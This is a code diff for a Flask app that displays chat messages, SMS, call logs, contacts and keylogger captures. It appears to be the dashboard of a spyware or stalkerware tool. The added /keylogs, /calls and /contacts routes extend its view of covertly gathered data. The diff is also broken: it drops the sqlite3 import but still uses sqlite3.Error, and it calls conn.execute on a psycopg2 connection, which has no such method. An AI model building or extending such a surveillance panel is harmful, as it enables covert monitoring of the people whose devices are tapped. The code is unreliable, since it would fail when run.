@@ -1,5 +1,7 @@
 from flask import Flask, render_template, send_from_directory, request, jsonify
-import sqlite3
+import psycopg2
+from psycopg2.extras import RealDictCursor
+import os
 import logging
 
 # Configure logging
@@ -9,17 +11,14 @@ logger = logging.getLogger(__name__)
 # Initialize Flask app
 app = Flask(__name__)
 
-# Database configuration
-DATABASE = 'data.db'
-
 def get_db():
     try:
-        conn = sqlite3.connect(DATABASE)
-        conn.row_factory = sqlite3.Row
-        # Test the connection
-        conn.execute('SELECT 1').fetchone()
+        conn = psycopg2.connect(
+            os.environ['DATABASE_URL'],
+            cursor_factory=RealDictCursor
+        )
         return conn
-    except (sqlite3.Error, Exception) as e:
+    except Exception as e:
         logger.error(f"Database error: {e}")
         return None
 
@@ -31,16 +30,18 @@ def index():
         return "Database connection error", 500
     
     try:
-        contacts = conn.execute('''
-            SELECT DISTINCT name FROM (
-                SELECT sender AS name FROM ChatMessages 
-                UNION 
-                SELECT from_to AS name FROM SMS
-            ) ORDER BY name
-        ''').fetchall()
+        with conn.cursor() as cur:
+            cur.execute('''
+                SELECT DISTINCT name FROM (
+                    SELECT sender AS name FROM chat_messages 
+                    UNION 
+                    SELECT from_to AS name FROM sms
+                ) s ORDER BY name
+            ''')
+            contacts = cur.fetchall()
         conn.close()
         return render_template('main_menu.html', contacts=contacts)
-    except sqlite3.Error as e:
+    except Exception as e:
         logger.error(f"Database error: {e}")
         return "Error fetching contacts", 500
 
@@ -79,6 +80,57 @@ def sms_thread(name):
     except sqlite3.Error as e:
         logger.error(f"Database error: {e}")
         return "Error fetching messages", 500
+
+# Calls route
+@app.route('/calls')
+def calls():
+    conn = get_db()
+    if not conn:
+        return "Database connection error", 500
+    
+    try:
+        call_logs = conn.execute(
+            'SELECT * FROM Calls ORDER BY time DESC LIMIT 50'
+        ).fetchall()
+        conn.close()
+        return render_template('calls.html', call_logs=call_logs)
+    except sqlite3.Error as e:
+        logger.error(f"Database error: {e}")
+        return "Error fetching call logs", 500
+
+# Keylogs route
+@app.route('/keylogs')
+def keylogs():
+    conn = get_db()
+    if not conn:
+        return "Database connection error", 500
+    
+    try:
+        keylog_data = conn.execute(
+            'SELECT * FROM Keylogs ORDER BY time DESC LIMIT 50'
+        ).fetchall()
+        conn.close()
+        return render_template('keylogs.html', keylogs=keylog_data)
+    except sqlite3.Error as e:
+        logger.error(f"Database error: {e}")
+        return "Error fetching keylogs", 500
+
+# Contacts route
+@app.route('/contacts')
+def contacts_list():
+    conn = get_db()
+    if not conn:
+        return "Database connection error", 500
+    
+    try:
+        contact_data = conn.execute(
+            'SELECT * FROM Contacts ORDER BY name'
+        ).fetchall()
+        conn.close()
+        return render_template('contacts.html', contacts=contact_data)
+    except sqlite3.Error as e:
+        logger.error(f"Database error: {e}")
+        return "Error fetching contacts", 500
 
 # Search functionality
 @app.route('/search', methods=['POST'])
